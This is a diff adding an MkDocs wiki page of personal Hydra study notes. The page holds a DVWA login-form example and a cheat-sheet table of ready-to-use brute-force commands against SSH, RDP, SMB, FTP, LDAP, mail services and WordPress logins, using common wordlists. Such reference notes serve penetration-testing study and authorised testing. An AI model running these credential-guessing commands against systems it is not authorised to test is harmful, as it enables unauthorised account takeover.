@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        
+        <link rel="shortcut icon" href="../../img/favicon.ico">
+        <title>Hydra Notes - My Portfolio Wiki</title>
+        <link href="../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../../css/brands.min.css" rel="stylesheet">
+        <link href="../../css/solid.min.css" rel="stylesheet">
+        <link href="../../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../../css/base.css" rel="stylesheet">
+        <link id="hljs-light" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" >
+        <link id="hljs-dark" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github-dark.min.css" disabled>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+        <script>hljs.highlightAll();</script> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../..">My Portfolio Wiki</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../.." class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">Coding Language</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../python/" class="dropdown-item">Python</a>
+</li>
+                                    
+<li>
+    <a href="../../bash/" class="dropdown-item">Bash</a>
+</li>
+                                    
+<li>
+    <a href="../" class="dropdown-item">Markdown</a>
+</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            
+            <li class="nav-item" data-bs-level="2"><a href="#hydra-password-cracking-cheetsheet" class="nav-link">Hydra Password Cracking Cheetsheet</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h3 id="hydra-notes">Hydra Notes</h3>
+<h4 id="basic-hydra-command">Basic hydra command</h4>
+<p>this command must be edited to fit the paramaters of the login page. it's just a basic layout of the command. </p>
+<p><code>hydra 192.168.1.150 -l admin -P ‘pass.txt’ http-get-form “/dvwa/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=Username and/or password incorrect.:H=Cookie:PHPSESSID=13f2650bddf7a9ef68858ceea03c5d; security=low”</code></p>
+<h4 id="a-detailed-guide-on-hydra"><a href="https://www.hackingarticles.in/a-detailed-guide-on-hydra/">A Detailed Guide on Hydra</a></h4>
+<p>Targeted combinations</p>
+<p>If we have a list of usernames and passwords, we can implement a dictionary attack. But if we have more information on which usernames are likely to have a set of passwords, we can prepare a custom list for Hydra.</p>
+<p>For example, we can create a list of usernames and passwords separated by semicolons like the one below.</p>
+<p>username1:password1
+username2:password2
+username3:password3</p>
+<p>We can then use the -C flag to tell Hydra to run these specific combinations instead of looping through all the users and passwords. This drastically reduces the time taken to complete a brute-force attack.</p>
+<p>Here is the syntax.</p>
+<p><code>hydra -C &lt;combinations.txt&gt; &lt;ip&gt; &lt;service&gt;</code></p>
+<h2 id="hydra-password-cracking-cheetsheet">Hydra Password Cracking Cheetsheet</h2>
+<p>The following table uses the $ip variable which can be set with the following command:</p>
+<p><code>export ip 10.10.10.1</code></p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>hydra -P password-file.txt -v $ip snmp</code></td>
+<td>Hydra brute force against SNMP</td>
+</tr>
+<tr>
+<td><code>hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp</code></td>
+<td>Hydra FTP known user and rockyou password list</td>
+</tr>
+<tr>
+<td><code>hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh</code></td>
+<td>Hydra SSH using list of users and passwords</td>
+</tr>
+<tr>
+<td><code>hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh</code></td>
+<td>Hydra SSH using a known password and a username list</td>
+</tr>
+<tr>
+<td><code>hydra $ip -s 22 ssh -l -P big_wordlist.txt</code></td>
+<td>Hydra SSH Against Known username on port 22</td>
+</tr>
+<tr>
+<td><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V</code></td>
+<td>Hydra POP3 Brute Force</td>
+</tr>
+<tr>
+<td><code>hydra -P /usr/share/wordlists/nmap.lst $ip smtp -V</code></td>
+<td>Hydra SMTP Brute Force</td>
+</tr>
+<tr>
+<td><code>hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin</code></td>
+<td>Hydra attack http get 401 login with a dictionary</td>
+</tr>
+<tr>
+<td><code>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip</code></td>
+<td>Hydra attack Windows Remote Desktop with rockyou</td>
+</tr>
+<tr>
+<td><code>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb</code></td>
+<td>Hydra brute force SMB user with rockyou</td>
+</tr>
+<tr>
+<td><code>hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location'</code></td>
+<td>Hydra brute force a Wordpress admin login</td>
+</tr>
+<tr>
+<td><code>hydra -L usernames.txt -P passwords.txt $ip smb -V -f</code></td>
+<td>SMB Brute Forcing</td>
+</tr>
+<tr>
+<td><code>hydra -L users.txt -P passwords.txt $ip ldap2 -V -f</code></td>
+<td>LDAP Brute Forcing</td>
+</tr>
+</tbody>
+</table></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../js/base.js"></script>
+        <script src="../../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
